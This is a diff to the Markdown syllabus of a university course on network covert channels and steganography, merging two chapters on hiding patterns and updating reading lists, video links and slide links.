@@ -117,6 +117,8 @@ This chapter introduces basic methods for realizing network covert channels and 
 
 - **Reading Assignment:**
 	- L. Caviglione, W. Mazurczyk: [Understanding Information Hiding in iOS](https://ieeexplore.ieee.org/abstract/document/7030266), IEEE Computer, Vol. 48(1), 2015.
+    - T. Schmidbauer, S. Wendzel: [SoK: A Survey Of Indirect Network-level Covert Channels](https://www.researchgate.net/publication/358476184_SoK_A_Survey_Of_Indirect_Network-level_Covert_Channels). In: Proc. 17th ACM ASIA Conference on Computer and Communications Security (AsiaCCS’2022). ACM, DOI: 10.1145/3488932.3517418, in press.
+
 
 - **Network Covert Channel Tools:**
 	- [Source code of my network covert channel tools on GitHub](https://github.com/cdpxe/NetworkCovertChannels/) (phcct, pct, vstt, ...)
@@ -126,36 +128,25 @@ This chapter introduces basic methods for realizing network covert channels and 
 	- Can Information Hiding methods be applied to deduce cryptographic keys from encryption/decryption tools? If yes: how?
 ___
 
-### Week 3-b: Chapter 5-a - Getting the big picture: hiding patterns
+### Week 3-b: Chapter 5 - Getting the big picture: hiding patterns
 In this chapter, so-called *hiding patterns* are introduced. Patterns are a universal tool that is popular in software engineering and other disciplines, even outside of informatics. Hiding patterns are an easy way to describe and understand how data can be hidden using network covert channels. Instead of studying hundreds of separate hiding techniques, one can simply grasp all their core ideas using hiding patterns.
+The second part of this chapter introduces a revised version of the patterns taxonomy that is not specific to the network context. Instead, it can be applied to *all* domains of steganography. This revised model was introduced in August 2021 and contains certain additional features, such as the distinction between *embedding* and *representation* patterns.
 
-- **Video:** [YouTube](https://www.youtube.com/watch?v=0ztPHur0LUY)
+- **Video 1:** [YouTube](https://www.youtube.com/watch?v=0ztPHur0LUY)
+- **Video 2:** [YouTube](https://youtu.be/Eh0EJbq1quk)
 
 - **Slides:** [PDF](https://github.com/cdpxe/Network-Covert-Channels-A-University-level-Course/blob/master/slides/NIH_Ch5.pdf)
 
 - **Reading Assignment:**
 	- S. Wendzel, S. Zander, B. Fechner, C. Herdin: [Pattern-based survey and categorization of network covert channel techniques](https://doi.org/10.1145/2684195), ACM Computing Survey (CSUR), Vol. 47(3), ACM, 2015.
 	- W. Mazurczyk, S. Wendzel, S. Zander, A. Houmansadr, K. Szczypiorski: [Information Hiding in Communication Networks, **Chapter 3**](https://ieeexplore.ieee.org/book/7434879), WILEY-IEEE, 2016.
+	- S. Wendzel, L. Caviglione, W. Mazurczyk, A. Mileva, J. Dittmann, C. Krätzer, K. Lamshöft, C. Vielhauer, L. Hartmann, J. Keller, T. Neubert: [A Revised Taxonomy of Steganography Embedding Patterns](https://doi.org/10.1145/3465481.3470069), in Proc. 16th International Conference on Availability, Reliability and Security (ARES 2021). Association for Computing Machinery, DOI: 10.1145/3465481.3470069S.
 
 - **Optional Papers to Read:**
 	- W. Mazurczyk, S. Wendzel, K. Cabaj: [Towards Deriving Insights into Data Hiding Methods Using Pattern-based Approach](https://doi.org/10.1145/3230833.3233261), in Proc. ARES, ACM, 2018.
 
 - **Exercise:**
 	- Get an overview of the [CCEAP tool and its protocol](https://ih-patterns.blogspot.com/p/cceap.html). Work through the provided sample [exercises](https://github.com/cdpxe/CCEAP/tree/master/sample_exercises) and try to understand the provided solutions.
-
-___
-
-### Week 3-c: Chapter 5-b - Revised hiding patterns: from network stego to all stego domains
-In this chapter, I introduce a revised version of the patterns taxonomy that is not specific to the network context. Instead, it can be applied to *all* domains of steganography. This revised model was introduced in August 2021 and contains certain additional features, such as the distinction between *embedding* and *representation* patterns.
-
-- **Video:** [YouTube](https://youtu.be/Eh0EJbq1quk)
-
-- **Slides:** [PDF](https://github.com/cdpxe/Network-Covert-Channels-A-University-level-Course/blob/master/slides/NIH_Ch5b.pdf)
-
-- **Reading Assignment:**
-	- S. Wendzel, L. Caviglione, W. Mazurczyk, A. Mileva, J. Dittmann, C. Krätzer, K. Lamshöft, C. Vielhauer, L. Hartmann, J. Keller, T. Neubert: [A Revised Taxonomy of Steganography Embedding Patterns](https://doi.org/10.1145/3465481.3470069), in Proc. 16th International Conference on Availability, Reliability and Security (ARES 2021). Association for Computing Machinery, DOI: 10.1145/3465481.3470069S.
-
-- **Exercise:**
 	- Why is it useful to differentiate between embedding and representation patterns?
 	- Explain the partial backwards-compatibility to the network-specific patterns taxonomy.
 	- Explain the difference between the *objects* mentioned in the paper.
@@ -253,8 +244,7 @@ In the Internet of Things (and Cyber-physical Systems, CPS), data can either be 
 
 - **Video:** [part A, YouTube](https://www.youtube.com/watch?v=P9XYV4mcPV0), [part B, YouTube](https://www.youtube.com/watch?v=Q7eAcBzojvo). Part B is the video of the talk S. Wendzel, G. Haas, W. Mazurczyk: *Information Hiding in Cyber-physical Systems*, presented during the 2nd Int. BioSTAR workshop in late May, 2017 (IEEE Security & Privacy Workshops, San José, CA)
 
-- **Slides:** [part A, PDF](https://github.com/cdpxe/Network-Covert-Channels-A-University-level-Course/blob/master/slides/NIH_Ch10a.pdf)
-, [part B, PDF](https://github.com/cdpxe/Network-Covert-Channels-A-University-level-Course/blob/master/slides/NIH_Ch10b.pdf)
+- **Slides:** [PDF](https://github.com/cdpxe/Network-Covert-Channels-A-University-level-Course/blob/master/slides/NIH_Ch10.pdf)
 
 - **Reading Assignment:**
 	- S. Wendzel, W. Mazurczyk, G. Haas: [Steganography for Cyber-physical Systems](http://www.riverpublishers.com/journaldownload.php?file=RP_Journal_2245-1439_621.pdf), Journal of Cyber Security and Mobility (JCSM), Vol. 6(2), pp. 105-126, River Publishers, 2017.
